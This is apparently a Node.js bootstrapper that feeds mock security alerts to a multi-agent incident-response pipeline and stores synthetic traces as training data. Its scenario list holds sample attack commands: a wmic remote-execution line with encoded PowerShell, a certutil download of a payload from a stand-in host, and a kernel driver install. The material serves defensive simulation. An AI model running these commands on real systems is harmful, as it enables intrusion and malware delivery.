
'use strict';

require('dotenv').config();
const { initializeRuntime } = require('../src/agent_runtime/init');
const { createClient } = require('redis');

const MODE = process.env.WARGAMES_MODE || 'simulation';
const BATCH_LIMIT = parseInt(process.env.WARGAMES_BATCH_LIMIT || '10', 10);

console.log(`\n[🔥] MASSIVE ZERO-DAY BOOTSTRAPPER INITIALIZING...`);
console.log(`[🔥] MODE: ${MODE.toUpperCase()}`);
console.log(`[🔥] BATCH LIMIT: ${BATCH_LIMIT}\n`);


const THREAT_SCENARIOS = [
    {
        eventType: 'ZERO_DAY_EXPLOIT',
        severity: 'CRITICAL',
        sourceIp: '185.15.22.4',
        targetServer: 'gateway-01',
        description: 'Novel heap-buffer overflow in public-facing VPN endpoint. Pre-auth RCE.',
        payload: 'A*4000 + \\x90\\x90\\x90 + [SHELLCODE]'
    },
    {
        eventType: 'APT_LATERAL_MOVEMENT',
        severity: 'HIGH',
        sourceIp: '10.0.5.12',
        targetServer: 'dc-01',
        description: 'WMI execution via Pass-the-Hash. Evading standard EDR signatures.',
        payload: 'wmic /node:dc-01 process call create "powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBl..."'
    },
    {
        eventType: 'LIVING_OFF_THE_LAND',
        severity: 'HIGH',
        sourceIp: '10.0.8.50',
        targetServer: 'db-cluster',
        description: 'Using certutil.exe to download encrypted payload from compromised CDN.',
        payload: 'certutil.exe -urlcache -split -f "https://cdn-legit.com/updates/win.ini" C:\\Windows\\Temp\\update.dll'
    },
    {
        eventType: 'KERNEL_ROOTKIT_INSTALL',
        severity: 'CRITICAL',
        sourceIp: '127.0.0.1',
        targetServer: 'localhost',
        description: 'Bring-Your-Own-Vulnerable-Driver (BYOVD) attack targeting anti-cheat driver.',
        payload: 'sc create vulnerable_driver type= kernel binpath= C:\\Temp\\vuln.sys'
    }
];

async function run() {
    
    const redisClient = createClient({
        url: process.env.REDIS_URL || 'redis://localhost:6379',
        socket: { reconnectStrategy: false }
    });

    try {
        await redisClient.connect();
    } catch (e) {
        console.warn(`[⚠️] Redis connection failed: ${e.message}. Bootstrapper requires Redis for trace harvesting. Exiting.`);
        process.exit(1);
    }

    const runtime = initializeRuntime(redisClient);
    
    
    if (MODE !== 'live') {
        console.log(`[🛡️] SIMULATION MODE ACTIVE. Will generate ${BATCH_LIMIT} mock payload traces without invoking live LLMs.`);
    }

    let generatedTraces = 0;

    console.log(`[🚀] Commencing massive zero-day synthesis...`);

    for (let i = 0; i < BATCH_LIMIT; i++) {
        const scenario = THREAT_SCENARIOS[i % THREAT_SCENARIOS.length];
        
        const mockAlert = {
            alertId: `BOOTSTRAP-${Date.now()}-${i}`,
            eventType: scenario.eventType,
            severity: scenario.severity,
            sourceIp: scenario.sourceIp,
            targetServer: scenario.targetServer,
            payload: scenario.payload,
            description: scenario.description
        };

        if (MODE === 'live') {
            console.log(`[⚔️] LIVE INJECTION: Sending Alert ${mockAlert.alertId} to AgentRuntime...`);
            try {
                
                await runtime.run('IncidentCommanderAgent', {
                    type: 'INCIDENT_ESCALATION',
                    incident: mockAlert
                });
                console.log(`[✅] Trace generated and automatically harvested.`);
                generatedTraces++;
            } catch (err) {
                console.error(`[❌] Pipeline failed: ${err.message}`);
            }
        } else {
            
            console.log(`[🧪] SIMULATION: Crafting synthetic trace for ${mockAlert.eventType}...`);
            
            const syntheticTrace = {
                trace_id: `SIM-TRACE-${Date.now()}-${i}`,
                alert_id: mockAlert.alertId,
                incident: mockAlert,
                agent_outputs: {
                    'IncidentCommanderAgent': {
                        success: true,
                        recommendation: 'ISOLATE_NODE',
                        confidence: 0.95,
                        delegation_plan: ['DetectionEngineerAgent', 'ThreatIntelligenceAgent']
                    },
                    'DetectionEngineerAgent': {
                        success: true,
                        mitre_attack: { tactic: 'Lateral Movement', technique: 'T1047' }
                    }
                },
                tool_calls: [
                    { tool: 'SIGMA_EVAL', result: 'MATCHED' },
                    { tool: 'ZMQ_BLOCK', result: 'SUCCESS' }
                ],
                timestamp: new Date().toISOString()
            };

            await redisClient.lPush('bayezid:training_backlog:raw', JSON.stringify(syntheticTrace));
            generatedTraces++;
        }
        
        
        await new Promise(r => setTimeout(r, 100));
    }

    console.log(`\n[🏁] BOOTSTRAPPER COMPLETE.`);
    console.log(`[🏁] Total Traces Generated & Harvested: ${generatedTraces}`);
    
    
    console.log(`\n[🧹] Waking up AIDataRemediationEngineer to process the backlog...`);
    
    try {
        
        const rawTraces = await redisClient.lRange('bayezid:training_backlog:raw', 0, -1);
        
        if (rawTraces && rawTraces.length > 0) {
            const remediationAgent = runtime.getAgent('AIDataRemediationEngineer');
            if (remediationAgent) {
                const result = await remediationAgent.execute({ rawTraces }, { toolRouter: runtime.toolRouter, traceId: 'BOOTSTRAP-PROCESS' });
                console.log(`[✨] Remediation Engineer Status: ${result.status}`);
                console.log(`[✨] Curated: ${result.curated_count} | Total in Batch: ${result.batch_size}`);
                
                
                await redisClient.del('bayezid:training_backlog:raw');
            } else {
                 console.warn(`[⚠️] AIDataRemediationEngineer not registered in runtime.`);
            }
        } else {
            console.log(`[🤷] No raw traces found in Redis backlog.`);
        }
    } catch (e) {
        console.error(`[❌] Failed to execute Remediation Engineer: ${e.message}`);
    }

    process.exit(0);
}

run().catch(console.error);
